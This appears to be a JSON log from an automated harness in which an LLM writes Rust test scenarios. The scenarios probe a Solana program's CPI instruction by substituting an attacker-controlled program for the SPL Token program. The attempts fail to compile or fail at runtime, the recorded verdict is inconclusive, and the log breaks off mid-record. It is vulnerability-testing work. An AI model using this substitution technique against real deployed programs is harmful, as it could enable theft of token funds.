@@ -1,0 +1,461 @@
+{
+  "category": "CPI",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "Failure(IncorrectProgramId)",
+  "reason": "o baseline 'cpi legitimo com SPL Token' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2319,
+        "completion_tokens": 1139,
+        "latency_s": 6.01
+      },
+      "raw": "{\n  \"plan\": \"O cenário monta contas de token SPL legítimas (source, destination, authority) e um programa atacante no lugar do token_program. O baseline usa o SPL Token real como token_program e deve ter sucesso. O ataque substitui o token_program pelo programa do atacante, mantendo as demais contas iguais. O efeito mede se o programa atacante foi invocado (ex.: lamports transferidos ou dados alterados pelo atacante), o que não ocorre no baseline.\",\n  \"scenario\": \"let attacker_program = env.attacker_program.expect(\\\"attacker program required\\\");\\n\\n// Contas de token SPL legítimas (apenas para o baseline; o ataque não as usa de verdade)\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet authority = Pubkey::new_unique();\\n\\nlet source_account = account(&spl_token::id(), &[0u8; 165], None);\\nlet destination_account = account(&spl_token::id(), &[0u8; 165], None);\\nlet authority_account = wallet(1_000_000_000);\\n\\n// Programa SPL Token real\\nlet token_program_account = program_account(&spl_token::id());\\n\\n// Programa atacante\\nlet attacker_program_account = program_account(&attacker_program);\\n\\n// Baseline: usa o SPL Token real como token_program\\nlet baseline_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token::id(), false),\\n    ],\\n);\\nlet baseline_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token::id(), token_program_account.clone()),\\n];\\nlet baseline_result = env.baseline(\\\"cpi legítimo com SPL Token\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: substitui o token_program pelo programa do atacante\\nlet attack_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(attacker_program, false),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (source, source_account),\\n    (destination, destination_account),\\n    (authority, authority_account),\\n    (attacker_program, attacker_program_account),\\n];\\nlet attack_result = env.attack(\\\"cpi com token_program malicioso\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    // O ataque é bem-sucedido se o programa atacante foi invocado.\\n    // Como o atacante pode alterar lamports ou dados, verificamos se a conta do atacante\\n    // teve seus lamports reduzidos (indicando execução) ou se alguma conta de token foi modificada.\\n    let attacker_after = after(&attack_result, &attacker_program);\\n    let source_after = after(&attack_result, &source);\\n    let destination_after = after(&attack_result, &destination);\\n\\n    // Condição 1: o programa atacante foi executado (lamports da conta do programa diminuíram)\\n    let attacker_lamports_before = attacker_program_account.lamports();\\n    let attacker_lamports_after = attacker_after.lamports();\\n    env.effect(\\n        \\\"programa atacante foi invocado (lamports reduzidos)\\\",\\n        attacker_lamports_after < attacker_lamports_before,\\n    );\\n\\n    // Condição 2: os dados da conta source foram alterados pelo atacante\\n    let source_data_before = source_account.data();\\n    let source_data_after = source_after.data();\\n    env.effect(\\n        \\\"dados da conta source alterados pelo atacante\\\",\\n        source_data_after != source_data_before,\\n    );\\n\\n    // Condição 3: os dados da conta destination foram alterados pelo atacante\\n    let destination_data_before = destination_account.data();\\n    let destination_data_after = destination_after.data();\\n    env.effect(\\n        \\\"dados da conta destination alterados pelo atacante\\\",\\n        destination_data_after != destination_data_before,\\n    );\\n}\"\n}",
+      "plan": "O cenário monta contas de token SPL legítimas (source, destination, authority) e um programa atacante no lugar do token_program. O baseline usa o SPL Token real como token_program e deve ter sucesso. O ataque substitui o token_program pelo programa do atacante, mantendo as demais contas iguais. O efeito mede se o programa atacante foi invocado (ex.: lamports transferidos ou dados alterados pelo atacante), o que não ocorre no baseline.",
+      "scenario": "let attacker_program = env.attacker_program.expect(\"attacker program required\");\n\n// Contas de token SPL legítimas (apenas para o baseline; o ataque não as usa de verdade)\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet authority = Pubkey::new_unique();\n\nlet source_account = account(&spl_token::id(), &[0u8; 165], None);\nlet destination_account = account(&spl_token::id(), &[0u8; 165], None);\nlet authority_account = wallet(1_000_000_000);\n\n// Programa SPL Token real\nlet token_program_account = program_account(&spl_token::id());\n\n// Programa atacante\nlet attacker_program_account = program_account(&attacker_program);\n\n// Baseline: usa o SPL Token real como token_program\nlet baseline_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token::id(), false),\n    ],\n);\nlet baseline_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token::id(), token_program_account.clone()),\n];\nlet baseline_result = env.baseline(\"cpi legítimo com SPL Token\", &baseline_ix, &baseline_accounts);\n\n// Ataque: substitui o token_program pelo programa do atacante\nlet attack_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(attacker_program, false),\n    ],\n);\nlet attack_accounts = vec![\n    (source, source_account),\n    (destination, destination_account),\n    (authority, authority_account),\n    (attacker_program, attacker_program_account),\n];\nlet attack_result = env.attack(\"cpi com token_program malicioso\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    // O ataque é bem-sucedido se o programa atacante foi invocado.\n    // Como o atacante pode alterar lamports ou dados, verificamos se a conta do atacante\n    // teve seus lamports reduzidos (indicando execução) ou se alguma conta de token foi modificada.\n    let attacker_after = after(&attack_result, &attacker_program);\n    let source_after = after(&attack_result, &source);\n    let destination_after = after(&attack_result, &destination);\n\n    // Condição 1: o programa atacante foi executado (lamports da conta do programa diminuíram)\n    let attacker_lamports_before = attacker_program_account.lamports();\n    let attacker_lamports_after = attacker_after.lamports();\n    env.effect(\n        \"programa atacante foi invocado (lamports reduzidos)\",\n        attacker_lamports_after < attacker_lamports_before,\n    );\n\n    // Condição 2: os dados da conta source foram alterados pelo atacante\n    let source_data_before = source_account.data();\n    let source_data_after = source_after.data();\n    env.effect(\n        \"dados da conta source alterados pelo atacante\",\n        source_data_after != source_data_before,\n    );\n\n    // Condição 3: os dados da conta destination foram alterados pelo atacante\n    let destination_data_before = destination_account.data();\n    let destination_data_after = destination_after.data();\n    env.effect(\n        \"dados da conta destination alterados pelo atacante\",\n        destination_data_after != destination_data_before,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:16:35\n   |\n16 |     let source_account = account(&spl_token::id(), &[0u8; 165], None);\n   |                                   ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:17:40\n   |\n17 | ...ion_account = account(&spl_token::id(), &[0u8; 165], None);\n   |                           ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:21:50\n   |\n21 |     let token_program_account = program_account(&spl_token::id());\n   |                                                  ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:34:39\n   |\n34 |             AccountMeta::new_readonly(spl_token::id(), false),\n   |                                       ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:41:10\n   |\n41 |         (spl_token::id(), token_program_account.clone()),\n   |          ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:16:35\n   |\n16 |     let source_account = account(&spl_token::id(), &[0u8; 165], None);\n   |                                   ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:17:40\n   |\n17 | ...ion_account = account(&spl_token::id(), &[0u8; 165], None);\n   |                           ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:21:50\n   |\n21 |     let token_program_account = program_account(&spl_token::id());\n   |                                                  ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:34:39\n   |\n34 |             AccountMeta::new_readonly(spl_token::id(), false),\n   |                                       ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:41:10\n   |\n41 |         (spl_token::id(), token_program_account.clone()),\n   |          ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3817,
+        "completion_tokens": 1257,
+        "latency_s": 6.13
+      },
+      "raw": "{\n  \"plan\": \"O cenário monta contas de token SPL mínimas (source, destination, authority) e um programa atacante. O baseline usa o SPL Token real como token_program e deve ter sucesso. O ataque substitui o token_program pelo programa do atacante, que aceita qualquer instrução. O efeito mede se o programa atacante foi invocado, verificando se os lamports da conta do programa atacante diminuíram ou se os dados das contas de token foram alterados.\",\n  \"scenario\": \"let attacker_program = env.attacker_program.expect(\\\"attacker program required\\\");\\n\\n// Contas de token SPL legítimas (apenas para o baseline; o ataque não as usa de verdade)\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet authority = Pubkey::new_unique();\\n\\n// ID do SPL Token (conhecido)\\nlet spl_token_id = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\nlet source_account = account(&spl_token_id, &[0u8; 165], None);\\nlet destination_account = account(&spl_token_id, &[0u8; 165], None);\\nlet authority_account = wallet(1_000_000_000);\\n\\n// Programa SPL Token real\\nlet token_program_account = program_account(&spl_token_id);\\n\\n// Programa atacante\\nlet attacker_program_account = program_account(&attacker_program);\\n\\n// Baseline: usa o SPL Token real como token_program\\nlet baseline_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\nlet baseline_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n];\\nlet baseline_result = env.baseline(\\\"cpi legítimo com SPL Token\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: substitui o token_program pelo programa do atacante\\nlet attack_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(attacker_program, false),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (source, source_account),\\n    (destination, destination_account),\\n    (authority, authority_account),\\n    (attacker_program, attacker_program_account),\\n];\\nlet attack_result = env.attack(\\\"cpi com token_program malicioso\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    // O ataque é bem-sucedido se o programa atacante foi invocado.\\n    // Como o atacante pode alterar lamports ou dados, verificamos se a conta do atacante\\n    // teve seus lamports reduzidos (indicando execução) ou se alguma conta de token foi modificada.\\n    let attacker_after = after(&attack_result, &attacker_program);\\n    let source_after = after(&attack_result, &source);\\n    let destination_after = after(&attack_result, &destination);\\n\\n    // Condição 1: o programa atacante foi executado (lamports da conta do programa diminuíram)\\n    let attacker_lamports_before = attacker_program_account.lamports();\\n    let attacker_lamports_after = attacker_after.lamports();\\n    env.effect(\\n        \\\"programa atacante foi invocado (lamports reduzidos)\\\",\\n        attacker_lamports_after < attacker_lamports_before,\\n    );\\n\\n    // Condição 2: os dados da conta source foram alterados pelo atacante\\n    let source_data_before = source_account.data();\\n    let source_data_after = source_after.data();\\n    env.effect(\\n        \\\"dados da conta source alterados pelo atacante\\\",\\n        source_data_after != source_data_before,\\n    );\\n\\n    // Condição 3: os dados da conta destination foram alterados pelo atacante\\n    let destination_data_before = destination_account.data();\\n    let destination_data_after = destination_after.data();\\n    env.effect(\\n        \\\"dados da conta destination alterados pelo atacante\\\",\\n        destination_data_after != destination_data_before,\\n    );\\n}\"\n}",
+      "plan": "O cenário monta contas de token SPL mínimas (source, destination, authority) e um programa atacante. O baseline usa o SPL Token real como token_program e deve ter sucesso. O ataque substitui o token_program pelo programa do atacante, que aceita qualquer instrução. O efeito mede se o programa atacante foi invocado, verificando se os lamports da conta do programa atacante diminuíram ou se os dados das contas de token foram alterados.",
+      "scenario": "let attacker_program = env.attacker_program.expect(\"attacker program required\");\n\n// Contas de token SPL legítimas (apenas para o baseline; o ataque não as usa de verdade)\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet authority = Pubkey::new_unique();\n\n// ID do SPL Token (conhecido)\nlet spl_token_id = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\nlet source_account = account(&spl_token_id, &[0u8; 165], None);\nlet destination_account = account(&spl_token_id, &[0u8; 165], None);\nlet authority_account = wallet(1_000_000_000);\n\n// Programa SPL Token real\nlet token_program_account = program_account(&spl_token_id);\n\n// Programa atacante\nlet attacker_program_account = program_account(&attacker_program);\n\n// Baseline: usa o SPL Token real como token_program\nlet baseline_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\nlet baseline_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n];\nlet baseline_result = env.baseline(\"cpi legítimo com SPL Token\", &baseline_ix, &baseline_accounts);\n\n// Ataque: substitui o token_program pelo programa do atacante\nlet attack_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(attacker_program, false),\n    ],\n);\nlet attack_accounts = vec![\n    (source, source_account),\n    (destination, destination_account),\n    (authority, authority_account),\n    (attacker_program, attacker_program_account),\n];\nlet attack_result = env.attack(\"cpi com token_program malicioso\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    // O ataque é bem-sucedido se o programa atacante foi invocado.\n    // Como o atacante pode alterar lamports ou dados, verificamos se a conta do atacante\n    // teve seus lamports reduzidos (indicando execução) ou se alguma conta de token foi modificada.\n    let attacker_after = after(&attack_result, &attacker_program);\n    let source_after = after(&attack_result, &source);\n    let destination_after = after(&attack_result, &destination);\n\n    // Condição 1: o programa atacante foi executado (lamports da conta do programa diminuíram)\n    let attacker_lamports_before = attacker_program_account.lamports();\n    let attacker_lamports_after = attacker_after.lamports();\n    env.effect(\n        \"programa atacante foi invocado (lamports reduzidos)\",\n        attacker_lamports_after < attacker_lamports_before,\n    );\n\n    // Condição 2: os dados da conta source foram alterados pelo atacante\n    let source_data_before = source_account.data();\n    let source_data_after = source_after.data();\n    env.effect(\n        \"dados da conta source alterados pelo atacante\",\n        source_data_after != source_data_before,\n    );\n\n    // Condição 3: os dados da conta destination foram alterados pelo atacante\n    let destination_data_before = destination_account.data();\n    let destination_data_after = destination_after.data();\n    env.effect(\n        \"dados da conta destination alterados pelo atacante\",\n        destination_data_after != destination_data_before,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0382]: borrow of moved value: `attacker_program_account`\n  --> tests/attempt.rs:79:40\n   |\n30 |     let attacker_program_account = program_account(&attacker_program);\n   |         ------------------------ move occurs because `attacker_program_account` has type `AccountSharedData`, which does not implement the `Copy` trait\n...\n66 |         (attacker_program, attacker_program_account),\n   |                            ------------------------ value moved here\n...\n79 |         let attacker_lamports_before = attacker_program_account.lampor...\n   |                                        ^^^^^^^^^^^^^^^^^^^^^^^^ value borrowed here after move\n   |\nerror[E0382]: borrow of moved value: `source_account`\n  --> tests/attempt.rs:87:34\n   |\n22 |     let source_account = account(&spl_token_id, &[0u8; 165], None);\n   |         -------------- move occurs because `source_account` has type `AccountSharedData`, which does not implement the `Copy` trait\n...\n63 |         (source, source_account),\n   |                  -------------- value moved here\n...\n87 |         let source_data_before = source_account.data();\n   |                                  ^^^^^^^^^^^^^^ value borrowed here after move\n   |\nerror[E0382]: borrow of moved value: `destination_account`\n  --> tests/attempt.rs:95:39\n   |\n23 |     let destination_account = account(&spl_token_id, &[0u8; 165], None);\n   |         ------------------- move occurs because `destination_account` has type `AccountSharedData`, which does not implement the `Copy` trait\n...\n64 |         (destination, destination_account),\n   |                       ------------------- value moved here\n...\n95 |         let destination_data_before = destination_account.data();\n   |                                       ^^^^^^^^^^^^^^^^^^^ value borrowed here after move\n   |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors",
+        "elapsed_s": 0.5
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0382]: borrow of moved value: `attacker_program_account`\n  --> tests/attempt.rs:79:40\n   |\n30 |     let attacker_program_account = program_account(&attacker_program);\n   |         ------------------------ move occurs because `attacker_program_account` has type `AccountSharedData`, which does not implement the `Copy` trait\n...\n66 |         (attacker_program, attacker_program_account),\n   |                            ------------------------ value moved here\n...\n79 |         let attacker_lamports_before = attacker_program_account.lampor...\n   |                                        ^^^^^^^^^^^^^^^^^^^^^^^^ value borrowed here after move\n   |\nerror[E0382]: borrow of moved value: `source_account`\n  --> tests/attempt.rs:87:34\n   |\n22 |     let source_account = account(&spl_token_id, &[0u8; 165], None);\n   |         -------------- move occurs because `source_account` has type `AccountSharedData`, which does not implement the `Copy` trait\n...\n63 |         (source, source_account),\n   |                  -------------- value moved here\n...\n87 |         let source_data_before = source_account.data();\n   |                                  ^^^^^^^^^^^^^^ value borrowed here after move\n   |\nerror[E0382]: borrow of moved value: `destination_account`\n  --> tests/attempt.rs:95:39\n   |\n23 |     let destination_account = account(&spl_token_id, &[0u8; 165], None);\n   |         ------------------- move occurs because `destination_account` has type `AccountSharedData`, which does not implement the `Copy` trait\n...\n64 |         (destination, destination_account),\n   |                       ------------------- value moved here\n...\n95 |         let destination_data_before = destination_account.data();\n   |                                       ^^^^^^^^^^^^^^^^^^^ value borrowed here after move\n   |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3803,
+        "completion_tokens": 1051,
+        "latency_s": 4.67
+      },
+      "raw": "{\"plan\": \"Preparo contas de token SPL (source, destination, authority) e o programa SPL Token real para o baseline. O baseline chama `cpi` com o token_program legítimo. O ataque substitui o token_program pelo programa do atacante, mantendo as demais contas iguais. O efeito mede se o programa atacante foi invocado, verificando que os lamports da conta do programa atacante diminuíram (execução) ou que os dados das contas de token foram alterados pelo atacante.\", \"scenario\": \"let attacker_program = env.attacker_program.expect(\\\"attacker program required\\\");\\n\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet authority = Pubkey::new_unique();\\n\\nlet spl_token_id = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\nlet source_account = account(&spl_token_id, &[0u8; 165], None);\\nlet destination_account = account(&spl_token_id, &[0u8; 165], None);\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet token_program_account = program_account(&spl_token_id);\\nlet attacker_program_account = program_account(&attacker_program);\\n\\nlet baseline_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\nlet baseline_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n];\\nlet _baseline_result = env.baseline(\\\"cpi legítimo com SPL Token\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(attacker_program, false),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (attacker_program, attacker_program_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"cpi com token_program malicioso\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let attacker_after = after(&attack_result, &attacker_program);\\n    let source_after = after(&attack_result, &source);\\n    let destination_after = after(&attack_result, &destination);\\n\\n    let attacker_lamports_before = attacker_program_account.lamports();\\n    let attacker_lamports_after = attacker_after.lamports();\\n    env.effect(\\n        \\\"programa atacante foi invocado (lamports reduzidos)\\\",\\n        attacker_lamports_after < attacker_lamports_before,\\n    );\\n\\n    let source_data_before = source_account.data();\\n    let source_data_after = source_after.data();\\n    env.effect(\\n        \\\"dados da conta source alterados pelo atacante\\\",\\n        source_data_after != source_data_before,\\n    );\\n\\n    let destination_data_before = destination_account.data();\\n    let destination_data_after = destination_after.data();\\n    env.effect(\\n        \\\"dados da conta destination alterados pelo atacante\\\",\\n        destination_data_after != destination_data_before,\\n    );\\n}\"}",
+      "plan": "Preparo contas de token SPL (source, destination, authority) e o programa SPL Token real para o baseline. O baseline chama `cpi` com o token_program legítimo. O ataque substitui o token_program pelo programa do atacante, mantendo as demais contas iguais. O efeito mede se o programa atacante foi invocado, verificando que os lamports da conta do programa atacante diminuíram (execução) ou que os dados das contas de token foram alterados pelo atacante.",
+      "scenario": "let attacker_program = env.attacker_program.expect(\"attacker program required\");\n\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet authority = Pubkey::new_unique();\n\nlet spl_token_id = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\nlet source_account = account(&spl_token_id, &[0u8; 165], None);\nlet destination_account = account(&spl_token_id, &[0u8; 165], None);\nlet authority_account = wallet(1_000_000_000);\n\nlet token_program_account = program_account(&spl_token_id);\nlet attacker_program_account = program_account(&attacker_program);\n\nlet baseline_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\nlet baseline_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n];\nlet _baseline_result = env.baseline(\"cpi legítimo com SPL Token\", &baseline_ix, &baseline_accounts);\n\nlet attack_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(attacker_program, false),\n    ],\n);\nlet attack_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (attacker_program, attacker_program_account.clone()),\n];\nlet attack_result = env.attack(\"cpi com token_program malicioso\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let attacker_after = after(&attack_result, &attacker_program);\n    let source_after = after(&attack_result, &source);\n    let destination_after = after(&attack_result, &destination);\n\n    let attacker_lamports_before = attacker_program_account.lamports();\n    let attacker_lamports_after = attacker_after.lamports();\n    env.effect(\n        \"programa atacante foi invocado (lamports reduzidos)\",\n        attacker_lamports_after < attacker_lamports_before,\n    );\n\n    let source_data_before = source_account.data();\n    let source_data_after = source_after.data();\n    env.effect(\n        \"dados da conta source alterados pelo atacante\",\n        source_data_after != source_data_before,\n    );\n\n    let destination_data_before = destination_account.data();\n    let destination_data_after = destination_after.data();\n    env.effect(\n        \"dados da conta destination alterados pelo atacante\",\n        destination_data_after != destination_data_before,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "cpi legítimo com SPL Token",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000000",
+                "digest": "2aa1fd6b1e4d7e43",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000000",
+                "digest": "2aa1fd6b1e4d7e43",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cpi com token_program malicioso",
+            "result": "Failure(IncorrectProgramId)",
+            "compute_units": 2873,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
